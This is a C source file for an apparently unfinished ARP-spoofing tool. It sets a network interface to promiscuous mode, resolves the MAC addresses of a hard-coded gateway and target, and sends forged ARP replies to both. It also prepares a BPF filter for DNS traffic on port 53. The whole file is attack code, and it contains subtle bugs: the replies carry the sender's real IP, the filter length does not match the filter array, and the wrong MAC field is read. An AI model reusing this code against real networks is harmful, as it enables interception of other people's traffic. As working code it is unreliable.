//Needed to get ether_arp to resolve proper size
#define _DEFAULT_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/filter.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/raw.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

//#define INTERFACE_NAME "enp0s31f6"
#define INTERFACE_NAME "wlp2s0"

//#define GATEWAY_IP "192.168.0.1"
//#define TARGET_IP "192.168.0.4"
//#define GATEWAY_IP "1.1.1.1"
//#define TARGET_IP "8.8.8.8"
#define GATEWAY_IP "142.232.49.6"
#define TARGET_IP "142.232.48.123"

struct thread_arg {
    int sock;
    unsigned char* victim_mac;
    uint32_t victim_ip;
};

//Filter code for udp port 53 only
struct sock_filter dns_filter[] = {
        {0x28, 0, 0, 0x0000000c},
        {0x15, 0, 6, 0x000086dd},
        {0x30, 0, 0, 0x00000014},
        {0x15, 0, 15, 0x00000011},
        {0x28, 0, 0, 0x00000036},
        {0x15, 12, 0, 0x00000035},
        {0x28, 0, 0, 0x00000038},
        {0x15, 10, 11, 0x00000035},
        {0x15, 0, 10, 0x00000800},
        {0x30, 0, 0, 0x00000017},
        {0x15, 0, 8, 0x00000011},
        {0x28, 0, 0, 0x00000014},
        {0x45, 6, 0, 0x00001fff},
        {0xb1, 0, 0, 0x0000000e},
        {0x48, 0, 0, 0x0000000e},
        {0x15, 2, 0, 0x00000035},
        {0x48, 0, 0, 0x00000010},
        {0x15, 0, 1, 0x00000035},
        {0x6, 0, 0, 0x00040000},
        {0x6, 0, 0, 0x00000000},
};

struct sock_fprog port_filter = {
    .len = 66,
    .filter = dns_filter
};

unsigned char local_mac[6];
int local_interface_index;

unsigned char gateway_mac[6];
unsigned char target_mac[6];

uint32_t local_ip;

uint32_t gateway_ip;
uint32_t target_ip;

void get_local_mac(int sock) {
    struct ifreq s;
    memset(&s, 0, sizeof(struct ifreq));
    strcpy(s.ifr_name, INTERFACE_NAME);

    if (ioctl(sock, SIOCGIFHWADDR, &s)) {
        perror("ioctl local mac");
        exit(EXIT_FAILURE);
    }
    memcpy(local_mac, s.ifr_addr.sa_data, 6);
    printf("Local mac address is: ");
    for (int i = 0; i < 6; ++i) {
        printf("%02x", (unsigned char) s.ifr_addr.sa_data[i]);
    }
    printf("\n");

    if (ioctl(sock, SIOCGIFADDR, &s)) {
        perror("ioctl local ip");
        exit(EXIT_FAILURE);
    }

    memcpy(&local_ip, &((struct sockaddr_in*) &s.ifr_addr)->sin_addr.s_addr, sizeof(uint32_t));
    printf("Local IP address is: %08x\n", local_ip);

    if (ioctl(sock, SIOCGIFINDEX, &s)) {
        perror("ioctl local ip");
        exit(EXIT_FAILURE);
    }

    local_interface_index = s.ifr_ifindex;
    printf("Local interface index is: %08x\n", local_interface_index);
}

void ping_ip(const char* ip) {
    char combined[200];
    memset(combined, 0, 200);
    snprintf(combined, 199, "ping -c 1 %s > /dev/null 2> /dev/null", ip);
    system(combined);
}

uint32_t convert_ip_to_int(const char* ip) {
    unsigned int a, b, c, d;
    sscanf(ip, "%u.%u.%u.%u", (unsigned int*) &a, (unsigned int*) &b, (unsigned int*) &c,
            (unsigned int*) &d);
    return a | (b << 8) | (c << 16) | (d << 24);
}

int get_mac_from_ip(int sock, const char* ip, unsigned char* out_mac) {
    if (!fork()) {
        ping_ip(ip);
        exit(EXIT_SUCCESS);
    }

    unsigned char buffer[65535];

    struct ether_header* eh = (struct ether_header*) buffer;
    struct iphdr* iph = (struct iphdr*) (buffer + sizeof(struct ether_header));

    uint32_t ip_int = convert_ip_to_int(ip);

    int size;
    while ((size = read(sock, buffer, 65535)) > 0) {
        //Check packet type
        if (size < 40) {
            //Size is too low
            continue;
        }
        if (iph->daddr == ip_int) {
            //Write out the found mac address
            memcpy(out_mac, eh->ether_dhost, 6);
            return 0;
        }
    }
    return -errno;
}

int create_packet_socket(void) {
    int pack_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    //Set to promiscuous mode
    struct ifreq ifopts;
    strncpy(ifopts.ifr_name, INTERFACE_NAME, IFNAMSIZ - 1);
    ioctl(pack_sock, SIOCGIFFLAGS, &ifopts);
    ifopts.ifr_flags |= IFF_PROMISC;
    ioctl(pack_sock, SIOCSIFFLAGS, &ifopts);

    return pack_sock;
}

void* flood_arp(void* ta) {
    const struct thread_arg* args = (const struct thread_arg*) ta;
    const int sock = args->sock;
    const unsigned char* victim_mac = args->victim_mac;
    const uint32_t victim_ip = args->victim_ip;

    unsigned char buffer[sizeof(struct ether_arp) + sizeof(struct ether_arp)];
    memset(buffer, 0, sizeof(struct ether_arp) + sizeof(struct ether_arp));

    struct ether_header* eh = (struct ether_header*) buffer;
    struct ether_arp* ea = (struct ether_arp*) (buffer + sizeof(struct ether_header));
    //Set target mac address
    memcpy(eh->ether_dhost, victim_mac, 6);
    //Set sender mac address
    memcpy(eh->ether_shost, local_mac, 6);
    eh->ether_type = htons(ETH_P_ARP);

    //Ethernet
    ea->arp_hrd = htons(ARPHRD_ETHER);
    //IPv4
    ea->arp_pro = htons(ETH_P_IP);
    //Hardware len
    ea->arp_hln = ETHER_ADDR_LEN;
    //Protocol len
    ea->arp_pln = sizeof(in_addr_t);

    //ARP reply
    ea->arp_op = htons(ARPOP_REPLY);
    //ea->arp_op = htons(2);

    //Set sender mac address
    memcpy(ea->arp_sha, local_mac, 6);

    //Set sender IP address
    memcpy(ea->arp_spa, &local_ip, 4);

    //Set target mac address
    memcpy(ea->arp_tha, victim_mac, 6);

    //Set target IP address
    memcpy(ea->arp_tpa, &victim_ip, 4);

    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = local_interface_index;
    addr.sll_halen = ETHER_ADDR_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);

    sendto(sock, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
            (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
    return NULL;
}

int main(void) {
    if (setuid(0)) {
        perror("setuid");
        exit(EXIT_FAILURE);
    }
    if (setgid(0)) {
        perror("setgid");
        exit(EXIT_FAILURE);
    }

    //Zero out to detect if they've been set
    memset(gateway_mac, 0, 6);
    memset(target_mac, 0, 6);

    gateway_ip = convert_ip_to_int(GATEWAY_IP);
    target_ip = convert_ip_to_int(TARGET_IP);

    int pack_sock = create_packet_socket();

    get_local_mac(pack_sock);

    printf("%08x\n", gateway_ip);
    printf("%08x\n", target_ip);

    if (get_mac_from_ip(pack_sock, GATEWAY_IP, gateway_mac)) {
        perror("Initial gateway mac read");
        exit(EXIT_FAILURE);
    }
    printf("%02x %02x %02x %02x %02x %02x\n", gateway_mac[0], gateway_mac[1], gateway_mac[2],
            gateway_mac[3], gateway_mac[4], gateway_mac[5]);
    if (get_mac_from_ip(pack_sock, TARGET_IP, target_mac)) {
        perror("Initial gateway mac read");
        exit(EXIT_FAILURE);
    }
    printf("%02x %02x %02x %02x %02x %02x\n", target_mac[0], target_mac[1], target_mac[2],
            target_mac[3], target_mac[4], target_mac[5]);

    struct thread_arg ta;
    ta.sock = pack_sock;
    ta.victim_mac = gateway_mac;
    ta.victim_ip = gateway_ip;

    pthread_t one;
    pthread_t two;

    pthread_create(&one, NULL, flood_arp, &ta);

    struct thread_arg tb;
    tb.sock = pack_sock;
    tb.victim_mac = target_mac;
    tb.victim_ip = target_ip;

    pthread_create(&two, NULL, &flood_arp, &tb);

    //if (setsockopt(pack_sock, SOL_SOCKET, SO_ATTACH_FILTER, &port_filter, sizeof(port_filter)) < 0) {
    if (setsockopt(pack_sock, SOL_SOCKET, SO_ATTACH_BPF, &port_filter, sizeof(port_filter)) < 0) {
        perror("packet filter");
        goto finish;
    }


finish:
    pthread_join(one, NULL);
    pthread_join(two, NULL);

    close(pack_sock);

    return EXIT_SUCCESS;
}
